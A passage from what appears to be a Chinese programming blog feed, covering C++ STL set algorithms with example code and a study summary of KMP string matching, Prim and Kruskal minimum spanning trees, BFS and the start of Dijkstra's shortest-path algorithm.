<p>&#x2F;&#x2F; beg1 容器1开始迭代器<br>&#x2F;&#x2F; end1 容器1结束迭代器<br>&#x2F;&#x2F; beg2 容器2开始迭代器<br>&#x2F;&#x2F; end2 容器2结束迭代器<br>&#x2F;&#x2F; dest 目标容器开始迭代器</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v2;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">		v<span class="number">2.</span><span class="built_in">push_back</span>(i<span class="number">+5</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; vTarget;</span><br><span class="line">	<span class="comment">//取两个里面较小的值给目标容器开辟空间</span></span><br><span class="line">	vTarget.<span class="built_in">resize</span>(<span class="built_in">min</span>(v<span class="number">1.</span><span class="built_in">size</span>(), v<span class="number">2.</span><span class="built_in">size</span>()));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//返回目标容器的最后一个元素的迭代器地址</span></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;::iterator itEnd = </span><br><span class="line">        <span class="built_in">set_intersection</span>(v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>(), v<span class="number">2.</span><span class="built_in">begin</span>(), v<span class="number">2.</span><span class="built_in">end</span>(), vTarget.<span class="built_in">begin</span>());</span><br><span class="line"></span><br><span class="line">	for_each(vTarget.<span class="built_in">begin</span>(), itEnd, <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong> </p>
<ul>
<li>求交集的两个集合必须的有序序列</li>
<li>目标容器开辟空间需要从<strong>两个容器中取小值</strong></li>
<li>set_intersection返回值既是交集中最后一个元素的位置</li>
</ul>
<h4 id="5-6-2-set-union"><a href="#5-6-2-set-union" class="headerlink" title="5.6.2 set_union"></a>5.6.2 set_union</h4><p><strong>功能描述：</strong></p>
<ul>
<li>求两个集合的并集</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>set_union(iterator beg1, iterator end1, iterator beg2, iterator end2, iterator dest);  </code></p>
<p>&#x2F;&#x2F; 求两个集合的并集</p>
<p>&#x2F;&#x2F; <strong>注意:两个集合必须是有序序列</strong></p>
<p>&#x2F;&#x2F; beg1 容器1开始迭代器<br>&#x2F;&#x2F; end1 容器1结束迭代器<br>&#x2F;&#x2F; beg2 容器2开始迭代器<br>&#x2F;&#x2F; end2 容器2结束迭代器<br>&#x2F;&#x2F; dest 目标容器开始迭代器</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v2;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">		v<span class="number">2.</span><span class="built_in">push_back</span>(i<span class="number">+5</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; vTarget;</span><br><span class="line">	<span class="comment">//取两个容器的和给目标容器开辟空间</span></span><br><span class="line">	vTarget.<span class="built_in">resize</span>(v<span class="number">1.</span><span class="built_in">size</span>() + v<span class="number">2.</span><span class="built_in">size</span>());</span><br><span class="line"></span><br><span class="line">	<span class="comment">//返回目标容器的最后一个元素的迭代器地址</span></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;::iterator itEnd = </span><br><span class="line">        <span class="built_in">set_union</span>(v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>(), v<span class="number">2.</span><span class="built_in">begin</span>(), v<span class="number">2.</span><span class="built_in">end</span>(), vTarget.<span class="built_in">begin</span>());</span><br><span class="line"></span><br><span class="line">	for_each(vTarget.<span class="built_in">begin</span>(), itEnd, <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong> </p>
<ul>
<li>求并集的两个集合必须的有序序列</li>
<li>目标容器开辟空间需要<strong>两个容器相加</strong></li>
<li>set_union返回值既是并集中最后一个元素的位置</li>
</ul>
<h4 id="5-6-3-set-difference"><a href="#5-6-3-set-difference" class="headerlink" title="5.6.3  set_difference"></a>5.6.3  set_difference</h4><p><strong>功能描述：</strong></p>
<ul>
<li>求两个集合的差集</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>set_difference(iterator beg1, iterator end1, iterator beg2, iterator end2, iterator dest);  </code></p>
<p>&#x2F;&#x2F; 求两个集合的差集</p>
<p>&#x2F;&#x2F; <strong>注意:两个集合必须是有序序列</strong></p>
<p>&#x2F;&#x2F; beg1 容器1开始迭代器<br>&#x2F;&#x2F; end1 容器1结束迭代器<br>&#x2F;&#x2F; beg2 容器2开始迭代器<br>&#x2F;&#x2F; end2 容器2结束迭代器<br>&#x2F;&#x2F; dest 目标容器开始迭代器</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myPrint</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="type">int</span> val)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v2;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">		v<span class="number">2.</span><span class="built_in">push_back</span>(i<span class="number">+5</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; vTarget;</span><br><span class="line">	<span class="comment">//取两个里面较大的值给目标容器开辟空间</span></span><br><span class="line">	vTarget.<span class="built_in">resize</span>( <span class="built_in">max</span>(v<span class="number">1.</span><span class="built_in">size</span>() , v<span class="number">2.</span><span class="built_in">size</span>()));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//返回目标容器的最后一个元素的迭代器地址</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v1与v2的差集为： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;::iterator itEnd = </span><br><span class="line">        <span class="built_in">set_difference</span>(v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>(), v<span class="number">2.</span><span class="built_in">begin</span>(), v<span class="number">2.</span><span class="built_in">end</span>(), vTarget.<span class="built_in">begin</span>());</span><br><span class="line">	for_each(vTarget.<span class="built_in">begin</span>(), itEnd, <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v2与v1的差集为： &quot;</span> &lt;&lt; endl;</span><br><span class="line">	itEnd = <span class="built_in">set_difference</span>(v<span class="number">2.</span><span class="built_in">begin</span>(), v<span class="number">2.</span><span class="built_in">end</span>(), v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>(), vTarget.<span class="built_in">begin</span>());</span><br><span class="line">	for_each(vTarget.<span class="built_in">begin</span>(), itEnd, <span class="built_in">myPrint</span>());</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong> </p>
<ul>
<li>求差集的两个集合必须的有序序列</li>
<li>目标容器开辟空间需要从<strong>两个容器取较大值</strong></li>
<li>set_difference返回值既是差集中最后一个元素的位置</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>关于常见基础问题应对算法的总结</title>
    <url>/2024/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/</url>
    <content><![CDATA[<h1 id="关于常见基础问题应对算法的总结"><a href="#关于常见基础问题应对算法的总结" class="headerlink" title="关于常见基础问题应对算法的总结"></a>关于常见基础问题应对算法的总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
  <div class="note p-4 mb-4 rounded-small info">
    <p>以下将以常见基础问题的对应解答方法进行算法实例与数据结构的总结</p>

  </div>

<h2 id="字符串匹配"><a href="#字符串匹配" class="headerlink" title="字符串匹配"></a>字符串匹配</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015001746389.png"
                      alt="image-20241015001746389"
                ></p>
<hr>
<h3 id="朴素模式匹配算法（暴力解决）"><a href="#朴素模式匹配算法（暴力解决）" class="headerlink" title="朴素模式匹配算法（暴力解决）"></a>朴素模式匹配算法（暴力解决）</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>主串长度为n，模式串长度为 m<br>将主串所有长度为m的子串依次与模式串对比，直到找到一个完全匹配的子串或所有的子串都不匹配为止</p>

  <div class="note p-4 mb-4 rounded-small warning">
    <p>最多有n-m+1个子串</p>

  </div>

<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015002049555.png"
                      alt="image-20241015002049555"
                ></p>
<h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015002108960.png"
                      alt="image-20241015002108960"
                ></p>
<hr>
<h3 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>根据next数组，不经过回溯主串指针达到减小时间复杂度</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015002436924.png"
                      alt="image-20241015002436924"
                ></p>
<h4 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015002518468.png"
                      alt="image-20241015002518468"
                ></p>
<h4 id="求next数组"><a href="#求next数组" class="headerlink" title="求next数组"></a>求next数组</h4><h5 id="手算"><a href="#手算" class="headerlink" title="手算"></a>手算</h5><p>根据当前字符的前端进行查找</p>
<table>
<thead>
<tr>
<th><strong>下标j</strong></th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
</tr>
</thead>
<tbody><tr>
<td><strong>模式串</strong></td>
<td>a</td>
<td>b</td>
<td>a</td>
<td>a</td>
<td>b</td>
<td>c</td>
<td>a</td>
<td>b</td>
<td>a</td>
</tr>
<tr>
<td><strong>next[j]</strong></td>
<td>-1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>0</td>
<td>1</td>
<td>3</td>
</tr>
</tbody></table>
<p>始终满足next[0]&#x3D;-1;next[1]&#x3D;0</p>
<p>计算next看前面的字符串和离自己最近的几个有相同的</p>
<p>next[2]看前面的”ab”，b没有和前面匹配的，则连1都没有</p>
<p>next[3]看前面的”aba”，a有相同的能够匹配</p>
<p>next[4]看前面的”abaa”，a有相同的能够匹配，但是aa没有能匹配的</p>
<p>next[5]看前面的”abaab”，b有相同的能够匹配，ab也有能匹配的，但aab没有能匹配的</p>
<p>next[6]看前面的”abaabc”，c没有能匹配的，则连1都没有</p>
<p>next[7]看前面的”abaabca”，a有相同的能够匹配，但是ca没有能匹配的</p>
<p>next[8]看前面的”abaabcab”，b有相同的能够匹配，ab也有能匹配的，但cab没有能匹配的</p>
<p>next[9]看前面的”abaabcaba”，a有相同的能够匹配，ba也有能匹配的，aba也有能匹配的，但caba没有能匹配的</p>
<p><strong>注意：”ababa”的next值为3，后面的aba与前面的aba能够匹配</strong></p>
<h5 id="机算"><a href="#机算" class="headerlink" title="机算"></a>机算</h5><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">GetNext</span><span class="params">(<span class="type">char</span>* t, <span class="type">int</span>* next)</span> &#123;</span><br><span class="line">    <span class="type">int</span> j = <span class="number">0</span>, k = <span class="number">-1</span>;</span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> t_len = <span class="built_in">strlen</span>(t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (j &lt; t_len - <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">-1</span> || t[j] == t[k]) &#123;</span><br><span class="line">            j++;</span><br><span class="line">            k++;</span><br><span class="line">            <span class="keyword">if</span> (t[j] != t[k])</span><br><span class="line">                next[j] = k;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                next[j] = next[k]; <span class="comment">// 优化</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            k = next[k];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 输出next数组</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;next数组: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; t_len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, next[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="算法优化"><a href="#算法优化" class="headerlink" title="算法优化"></a>算法优化</h4><p>将next值进行替换，减少不必要的时间，得到nextval数组再进行匹配</p>
<table>
<thead>
<tr>
<th><strong>下标j</strong></th>
<th>0</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
</tr>
</thead>
<tbody><tr>
<td><strong>模式串</strong></td>
<td>a</td>
<td>b</td>
<td>a</td>
<td>a</td>
<td>b</td>
<td>c</td>
<td>a</td>
<td>b</td>
<td>a</td>
</tr>
<tr>
<td><strong>next[j]</strong></td>
<td>-1</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
<td>2</td>
<td>0</td>
<td>1</td>
<td>3</td>
</tr>
<tr>
<td><strong>nextval[j]</strong></td>
<td>-1</td>
<td>0</td>
<td>-1</td>
<td>1</td>
<td>0</td>
<td>2</td>
<td>-1</td>
<td>0</td>
<td>1</td>
</tr>
</tbody></table>
<p>从后往前看（从前往后也可以），next[8]值为3，找到j为3，若二者的模式串字符相等，则将next[8]该改为next[3]，以此类推，得到优化有的nextval数组</p>
<hr>
<h3 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015002610032.png"
                      alt="image-20241015002610032"
                ></p>
<h2 id="求最小生成树"><a href="#求最小生成树" class="headerlink" title="求最小生成树"></a>求最小生成树</h2>
  <div class="note p-4 mb-4 rounded-small warning">
    <p>最小生成树不止一种</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000602373.png"
                      alt="image-20241015000602373"
                ></p>
<hr>
<h3 id="Prim算法（普里姆算法）"><a href="#Prim算法（普里姆算法）" class="headerlink" title="Prim算法（普里姆算法）"></a>Prim算法（普里姆算法）</h3><h4 id="简单记忆：根据节点找权值"><a href="#简单记忆：根据节点找权值" class="headerlink" title="简单记忆：根据节点找权值"></a>简单记忆：根据节点找权值</h4><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>从某一个顶点开始构建生成树;每次将代价最小的新顶点纳入生成树，直到所有顶点都纳入为止</p>
<h4 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h4><p>开始选中一点，找到距离其代价最小的顶点纳入树中，再找到这两个点的下一个最优点并纳入树中，知道全部纳入为止</p>
<h4 id="图实例"><a href="#图实例" class="headerlink" title="图实例"></a>图实例</h4><p>1、最开始只有一个“P城”点</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241014234729896.png"
                      alt="image-20241014234729896"
                ></p>
<p>2、找到距离其代价最小的顶点纳入树中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241014234807642.png"
                      alt="image-20241014234807642"
                ></p>
<p>如此往复继续查找这两个点所有代价中最小代价的点并纳入树中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241014234904830.png"
                      alt="image-20241014234904830"
                ></p>
<p>直到最后找完即可（最小生成树不只一种）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241014235001262.png"
                      alt="image-20241014235001262"
                ></p>
<h4 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000338410.png"
                      alt="image-20241015000338410"
                ></p>
<hr>
<h3 id="Kruskal算法（克鲁斯卡尔算法）"><a href="#Kruskal算法（克鲁斯卡尔算法）" class="headerlink" title="Kruskal算法（克鲁斯卡尔算法）"></a>Kruskal算法（克鲁斯卡尔算法）</h3><h4 id="简单记忆：根据权值画节点"><a href="#简单记忆：根据权值画节点" class="headerlink" title="简单记忆：根据权值画节点"></a>简单记忆：根据权值画节点</h4><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>每次选择一条权值最小的边，使这条边的两头连通(原本已经连通的就不选)，直到所有结点都连通</p>
<h4 id="理解-1"><a href="#理解-1" class="headerlink" title="理解"></a>理解</h4><p>找到整个体系中权值最小的边，将该边的两头纳入树中，再选择剩下的权值最小的边将该边的两头纳入树中，如果出现一边的两头已纳入的情况则忽略该边，直到所有结点都连通</p>
<h4 id="图示例"><a href="#图示例" class="headerlink" title="图示例"></a>图示例</h4><p>找到整个体系中权值最小的边</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241014235743359.png"
                      alt="image-20241014235743359"
                ></p>
<p>将该边的两头纳入树中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241014235755337.png"
                      alt="image-20241014235755337"
                ></p>
<p>再选择剩下的权值最小的边将该边的两头纳入树中</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241014235844715.png"
                      alt="image-20241014235844715"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241014235856083.png"
                      alt="image-20241014235856083"
                ></p>
<p>剩余的连接需要看是否连通（间接连通也是连通了）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241014235940173.png"
                      alt="image-20241014235940173"
                ></p>
<p>若没有连通则进行连通</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000004968-1728921605532-1.png"
                      alt="image-20241015000004968"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000106584.png"
                      alt="image-20241015000106584"
                ></p>
<h4 id="时间复杂度-2"><a href="#时间复杂度-2" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000403547.png"
                      alt="image-20241015000403547"
                ></p>
<hr>
<h3 id="比较-1"><a href="#比较-1" class="headerlink" title="比较"></a>比较</h3><p>Prim算法时间复杂度为O(|V|^2^)——适合边稠密图，即|E|大的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000338410.png"
                      alt="image-20241015000338410"
                ></p>
<p>Kruskal算法时间复杂度为O(|E|log<del>2</del>|E|)——适合边稀疏图，即|E|小的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000403547.png"
                      alt="image-20241015000403547"
                ></p>
<hr>
<h2 id="最短路径问题"><a href="#最短路径问题" class="headerlink" title="最短路径问题"></a>最短路径问题</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000511989.png"
                      alt="image-20241015000511989"
                ></p>
<hr>
<h3 id="BFS算法（广度优先算法）"><a href="#BFS算法（广度优先算法）" class="headerlink" title="BFS算法（广度优先算法）"></a>BFS算法（广度优先算法）</h3><h4 id="无权图"><a href="#无权图" class="headerlink" title="无权图"></a>无权图</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000808214.png"
                      alt="image-20241015000808214"
                ></p>
<h4 id="代码实现-2"><a href="#代码实现-2" class="headerlink" title="代码实现"></a>代码实现</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015000917252.png"
                      alt="image-20241015000917252"
                ></p>
<h4 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h4><p>利用队列对图进行层次遍历，加上pre前驱指针找到最短路径</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015001101608.png"
                      alt="image-20241015001101608"
                ></p>
<h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015004510040.png"
                      alt="image-20241015004510040"
                ></p>
<hr>
<h3 id="Dijkstra算法（迪杰斯特拉算法）"><a href="#Dijkstra算法（迪杰斯特拉算法）" class="headerlink" title="Dijkstra算法（迪杰斯特拉算法）"></a>Dijkstra算法（迪杰斯特拉算法）</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E9%81%97%E6%BC%8F%E9%97%AE%E9%A2%98%E8%A7%A3%E7%AD%94/image-20241015004914940.png"
                      alt="image-20241015004914940"
                ></p>
<h4 id="图示例-1"><a href="#图示例-1" class="headerlink" title="图示例"></a>图示例</h4><p>1、初始化3个数组，最短路径找不到就存为无穷，且其前驱设为-1表示没有前驱</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
